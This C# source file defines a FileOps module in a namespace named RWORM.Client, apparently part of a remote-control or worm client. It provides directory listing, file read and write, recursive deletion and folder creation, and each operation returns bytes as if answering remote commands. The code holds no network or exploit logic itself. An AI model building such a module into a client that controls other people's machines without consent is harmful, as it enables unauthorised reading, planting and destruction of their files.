using System;
using System.IO;
using System.Text;
using RWORM.Client.Core;

namespace RWORM.Client.Modules
{
    public static class FileOps
    {
        /// List directory contents as JSON.
        public static byte[] ListDirectory(string path)
        {
            var sb = new StringBuilder("[");
            bool first = true;
            try
            {
                var di = new DirectoryInfo(path);
                foreach (var d in di.GetDirectories())
                {
                    if (!first) sb.Append(',');
                    first = false;
                    string name = JsonHelper.Escape(d.Name);
                    string mod = d.LastWriteTimeUtc.ToString("o");
                    sb.Append($"{{\"name\":\"{name}\",\"type\":\"dir\",\"size\":0,\"modified\":\"{mod}\"}}");
                }
                foreach (var f in di.GetFiles())
                {
                    if (!first) sb.Append(',');
                    first = false;
                    string name = JsonHelper.Escape(f.Name);
                    string mod = f.LastWriteTimeUtc.ToString("o");
                    sb.Append($"{{\"name\":\"{name}\",\"type\":\"file\",\"size\":{f.Length},\"modified\":\"{mod}\"}}");
                }
                sb.Append(']');
                return Encoding.UTF8.GetBytes(sb.ToString());
            }
            catch (Exception ex)
            {
                string err = JsonHelper.Escape(ex.Message);
                return Encoding.UTF8.GetBytes($"[{{\"error\":\"{err}\"}}]");
            }
        }

        /// Read file bytes (up to 50 MB).
        public static byte[] ReadFile(string path)
        {
            try
            {
                var fi = new FileInfo(path);
                if (!fi.Exists) return MakeError("File not found");
                if (fi.Length > 50 * 1024 * 1024) return MakeError("File too large (>50 MB)");
                return File.ReadAllBytes(path);
            }
            catch (Exception ex) { return MakeError(ex.Message); }
        }

        /// Write file bytes. Returns OK or error JSON.
        public static byte[] WriteFile(string path, byte[] data)
        {
            try
            {
                Directory.CreateDirectory(Path.GetDirectoryName(path)!);
                File.WriteAllBytes(path, data);
                return Encoding.UTF8.GetBytes("{\"ok\":true}");
            }
            catch (Exception ex) { return MakeError(ex.Message); }
        }

        public static byte[] DeletePath(string path)
        {
            try
            {
                if (File.Exists(path)) File.Delete(path);
                else if (Directory.Exists(path)) Directory.Delete(path, recursive: true);
                return Encoding.UTF8.GetBytes("{\"ok\":true}");
            }
            catch (Exception ex) { return MakeError(ex.Message); }
        }

        public static byte[] MakeDir(string path)
        {
            try
            {
                Directory.CreateDirectory(path);
                return Encoding.UTF8.GetBytes("{\"ok\":true}");
            }
            catch (Exception ex) { return MakeError(ex.Message); }
        }

        private static byte[] MakeError(string msg)
        {
            string err = JsonHelper.Escape(msg);
            return Encoding.UTF8.GetBytes($"{{\"error\":\"{err}\"}}");
        }
    }
}
